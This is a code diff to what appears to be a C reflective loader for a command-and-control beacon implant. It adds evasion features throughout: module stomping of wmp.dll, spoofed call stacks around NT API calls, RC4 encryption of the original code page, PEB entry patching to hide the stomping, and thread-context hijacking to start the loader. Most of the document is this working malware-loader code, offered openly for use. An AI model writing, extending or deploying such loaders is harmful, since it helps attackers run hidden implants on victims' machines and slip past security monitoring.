@@ -4,6 +4,8 @@
 
 #include "include.h"
 
+#define STOMP L"wmp.dll"
+
 typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
         HMODULE     ImageBase,
         DWORD       Reason,
@@ -24,7 +26,18 @@ typedef struct
         D_API( NtProtectVirtualMemory );
         D_API( RtlCreateHeap );
 
+        D_API( RtlInitUnicodeString );
+        D_API( LdrLoadDll );
+
+        D_API( RtlRandomEx );
+
     } ntdll;
+
+    struct
+    {
+        D_API( SystemFunction032 );
+
+    } cryptsp;
 
 } API, *PAPI;
 
@@ -47,11 +60,15 @@ typedef struct
 
 SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
 {
-    PPEB    Peb;
-    HANDLE  hNtdll;
+    PPEB                Peb;
+    HANDLE              hNtdll;
+    HANDLE              hKb;
+    HANDLE              hCs;
+    UNICODE_STRING      Uni = { 0 };
 
-    Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
+    Peb    = NtCurrentTeb()->ProcessEnvironmentBlock;
     hNtdll = FindModule( H_LIB_NTDLL, Peb, NULL );
+    hKb    = FindModule( H_LIB_KERNELBASE, Peb, NULL );
     
     if( !hNtdll )
     {
@@ -61,6 +78,9 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     pApi->ntdll.NtAllocateVirtualMemory = FindFunction( hNtdll, H_API_NTALLOCATEVIRTUALMEMORY );
     pApi->ntdll.NtProtectVirtualMemory  = FindFunction( hNtdll, H_API_NTPROTECTVIRTUALMEMORY );
     pApi->ntdll.RtlCreateHeap           = FindFunction( hNtdll, H_API_RTLCREATEHEAP );
+    pApi->ntdll.LdrLoadDll              = FindFunction( hNtdll, H_API_LDRLOADDLL );
+    pApi->ntdll.RtlInitUnicodeString    = FindFunction( hNtdll, H_API_RTLINITUNICODESTRING );
+    pApi->ntdll.RtlRandomEx             = FindFunction( hNtdll, H_API_RTLRANDOMEX );
 
     if( !pApi->ntdll.NtAllocateVirtualMemory ||
         !pApi->ntdll.NtProtectVirtualMemory  ||
@@ -68,6 +88,10 @@ SECTION( B ) NTSTATUS resolveLoaderFunctions( PAPI pApi )
     {
         return -1;
     };
+
+    pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"cryptsp.dll" ) ) );
+    SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, NULL, C_PTR( 0 ), &Uni, &hCs );
+    pApi->cryptsp.SystemFunction032 = FindFunction( hCs, H_API_SYSTEMFUNCTION032 );
 
     return STATUS_SUCCESS;
 };
@@ -144,9 +168,9 @@ SECTION( B ) VOID fillStub( PVOID buffer, HANDLE heap, SIZE_T region )
 {
     PSTUB Stub = ( PSTUB )buffer;
 
-    Stub->Region = U_PTR( buffer );
-    Stub->Size   = U_PTR( region );
-    Stub->Heap   = heap;
+    Stub->Region            = U_PTR( buffer );
+    Stub->Size              = U_PTR( region );
+    Stub->Heap              = heap;
 };
 
 SECTION( B ) VOID executeBeacon( PVOID entry )
@@ -156,15 +180,59 @@ SECTION( B ) VOID executeBeacon( PVOID entry )
     Ent( ( HMODULE )OFFSET( Start ), 4, NULL );
 };
 
+// Patch the Entrypoint of our stomped dll in the PEB so it points to a ret. Just so PEB doesn't show signs of a module stomping
+SECTION( B ) VOID PatchPeb( PAPI Api, PVOID Module, PVOID AddrOfRet )
+{
+    PVOID                   Base   = NULL;
+    PIMAGE_NT_HEADERS       NtsHdr = NULL;
+    SIZE_T                  Length = 0;
+    CFG_CALL_TARGET_INFO    CfInfo = { 0 };
+
+    // Walk the PEB Modules, try to find the module we stomped
+    PLIST_ENTRY pModule      = ( ( PPEB ) NtCurrentTeb()->ProcessEnvironmentBlock )->Ldr->InLoadOrderModuleList.Flink;
+	PLIST_ENTRY pFirstModule = pModule;
+	do
+	{   
+        Base       = (( PLDR_DATA_TABLE_ENTRY ) pModule )->DllBase;
+        if ( Base == Module )
+        {
+            ( ( PLDR_DATA_TABLE_ENTRY ) pModule )->EntryPoint = AddrOfRet; // Need to execute a valid entrypoint; lets just do a ret
+            ( ( PLDR_DATA_TABLE_ENTRY ) pModule )->Flags = 0x8a2cc; // Flags of a normal library load it seems
+            return;
+        }
+        pModule =  pModule->Flink;
+	
+    } while ( pModule && pModule != pFirstModule );
+
+    return NULL;
+}
+
+SECTION( B ) VOID generateEncryptionKey( PAPI pApi, PSTUB Stub )
+{
+    ULONG Seed = SEED;
+    for( int i = 0; i < KEY_SIZE; i++ )
+    {
+        Seed = pApi->ntdll.RtlRandomEx( &Seed );
+        Stub->Key[i] = ( char )KEY_VALS[Seed % 61];
+    };
+};
+
 SECTION( B ) VOID Loader( VOID ) 
 {
-    API         Api;
-    REG         Reg;
-    NTSTATUS    Status;
-    PVOID       MemoryBuffer;
-    PVOID       Map;
-    HANDLE      BeaconHeap;
-    ULONG       OldProtection = 0;  
+    API               Api;
+    UNICODE_STRING    Uni                = { 0 };
+    REG               Reg;
+    NTSTATUS          Status;
+    PVOID             MemoryBuffer;
+    PVOID             Map;
+    HANDLE            BeaconHeap;
+    ULONG             OldProtection      = 0;  
+    PIMAGE_DOS_HEADER OverloadModule     = NULL;
+    PIMAGE_NT_HEADERS OverloadNt         = NULL;
+    PVOID             BackupPage         = NULL;
+    DWORD64           SzBackupPage       = 0;
+    USTRING           S32Key;
+    USTRING           S32Data;
     
     RtlSecureZeroMemory( &Api, sizeof( Api ) );
     RtlSecureZeroMemory( &Reg, sizeof( Reg ) );
@@ -172,17 +240,71 @@ SECTION( B ) VOID Loader( VOID )
     if( resolveLoaderFunctions( &Api ) == STATUS_SUCCESS )
     {
         calculateRegions( &Reg );
-        Status = Api.ntdll.NtAllocateVirtualMemory( ( HANDLE )-1, &MemoryBuffer, 0, &Reg.Full, MEM_COMMIT, PAGE_READWRITE );
+
+        OverloadModule = FindModule( HashString( OFFSET( STOMP ), NULL ), NULL, NULL );
+        if ( !OverloadModule )
+        {
+            Api.ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( STOMP ) ) );
+            ULONG flags = 0x2;
+            SPOOF( Api.ntdll.LdrLoadDll, NULL, NULL, NULL, &flags, &Uni, &OverloadModule ); // don't resolve references + don't execute dllmain stuff
+        }
+        OverloadNt    = C_PTR( U_PTR( OverloadModule ) + OverloadModule->e_lfanew );
+        SzBackupPage  = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+        SzBackupPage  += Reg.Full; 
+        Status        = SPOOF( Api.ntdll.NtAllocateVirtualMemory, NULL, NULL, ( HANDLE )-1, &BackupPage, 0, &SzBackupPage, MEM_COMMIT, PAGE_READWRITE );
+
         if( Status == STATUS_SUCCESS )
         {
+            // Allocate a heap
+            BeaconHeap = SPOOF( Api.ntdll.RtlCreateHeap, NULL, NULL, HEAP_GROWABLE, NULL, 0, 0, NULL, NULL  );
+
+            // Copy the original .text into the backup page
+            memcpy( BackupPage, U_PTR( OverloadModule ) + IMAGE_FIRST_SECTION( OverloadNt )->VirtualAddress, IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData );
+
+            // Map beacon into the backup page
+            copyStub( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData );
+            Map = copyBeaconSections( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, Reg );
+            installHooks( Map, BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, Reg.NT );
+
+            // Now map beacon to stomp .text
+            MemoryBuffer =  U_PTR( OverloadModule ) + IMAGE_FIRST_SECTION( OverloadNt )->VirtualAddress;
+
+            SPOOF( Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Full, PAGE_READWRITE, &OldProtection );
+            RtlSecureZeroMemory( MemoryBuffer, Reg.Full );
             copyStub( MemoryBuffer );
             Map = copyBeaconSections( MemoryBuffer, Reg );
-            BeaconHeap = Api.ntdll.RtlCreateHeap( HEAP_GROWABLE, NULL, 0, 0, NULL, NULL );
-            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
+            
             installHooks( Map, MemoryBuffer, Reg.NT );
 
+            // Encrypt backup page and store key in stub
+            generateEncryptionKey( &Api, MemoryBuffer );
+            S32Key.len  = S32Key.maxlen = KEY_SIZE;
+            S32Key.str  = ( ( PSTUB )MemoryBuffer )->Key;
+            S32Data.len = S32Data.maxlen = SzBackupPage;
+            S32Data.str = ( PBYTE )( BackupPage );
+
+            // Encrypt the backup page
+            SPOOF( Api.cryptsp.SystemFunction032, NULL, NULL, &S32Data, &S32Key );
+
+            // Update data stubs in stomped .text
+            ( ( PSTUB )MemoryBuffer )->ExecRegion       = BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+            Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->VirtualAddress;
             Reg.Exec += IMAGE_FIRST_SECTION( Reg.NT )->SizeOfRawData;
-            Status = Api.ntdll.NtProtectVirtualMemory( ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
+            ( ( PSTUB )MemoryBuffer )->ExecRegionSize   = Reg.Exec;
+            ( ( PSTUB )MemoryBuffer )->OriginalText     = BackupPage;
+            ( ( PSTUB )MemoryBuffer )->OriginalTextSize = IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData;
+            ( ( PSTUB )MemoryBuffer )->BackupPageSize   = SzBackupPage;
+
+            // Fill in rest of stuff in data stubs in both the backup page and the stomped .text
+            fillStub( MemoryBuffer, BeaconHeap, Reg.Full );
+            memcpy( BackupPage+IMAGE_FIRST_SECTION( OverloadNt )->SizeOfRawData, MemoryBuffer, sizeof( STUB ) );
+
+            // Make Stub + Mapped beacon executable + excute
+            Status = SPOOF(Api.ntdll.NtProtectVirtualMemory, NULL, NULL, ( HANDLE )-1, &MemoryBuffer, &Reg.Exec, PAGE_EXECUTE_READ, &OldProtection );
+
+            // Patch the PEB Entrypoint of our stomped module
+            PatchPeb( &Api, OverloadModule, PTR_TO_HOOK( MemoryBuffer, GetRet ) );
+
             if( Status == STATUS_SUCCESS )
             {
                 executeBeacon( C_PTR( U_PTR( Map ) + Reg.NT->OptionalHeader.AddressOfEntryPoint ) );
@@ -227,8 +349,8 @@ SECTION( B ) NTSTATUS createBeaconThread( PAPI pApi, PHANDLE thread )
     BOOL Suspended = TRUE;
     PVOID StartAddress = C_PTR( pApi->ntdll.RtlUserThreadStart + 0x21 );
 
-    return pApi->ntdll.RtlCreateUserThread( ( HANDLE )-1, NULL, Suspended, 0, 0, 0, ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
-};
+    return SPOOF( pApi->ntdll.RtlCreateUserThread, NULL, NULL, ( HANDLE )-1, NULL, C_PTR( Suspended ), C_PTR( 0 ), C_PTR( 0 ), C_PTR( 0 ), ( PUSER_THREAD_START_ROUTINE )StartAddress, NULL, thread, NULL );
+}
 
 SECTION( B ) VOID Ace( VOID )
 {
@@ -244,11 +366,11 @@ SECTION( B ) VOID Ace( VOID )
         if( NT_SUCCESS( createBeaconThread( &Api, &Thread ) ) )
         {
             Ctx.ContextFlags = CONTEXT_CONTROL;
-            Api.ntdll.NtGetContextThread( Thread, &Ctx );
+            SPOOF( Api.ntdll.NtGetContextThread, NULL, NULL, Thread, &Ctx );
             Ctx.Rip = ( DWORD64 )C_PTR( Loader );
 
-            Api.ntdll.NtSetContextThread( Thread, &Ctx );
-            Api.ntdll.NtResumeThread( Thread, NULL );
+            SPOOF( Api.ntdll.NtSetContextThread, NULL, NULL, Thread, &Ctx );
+            SPOOF( Api.ntdll.NtResumeThread, NULL, NULL, Thread, NULL );
         };
     };
 
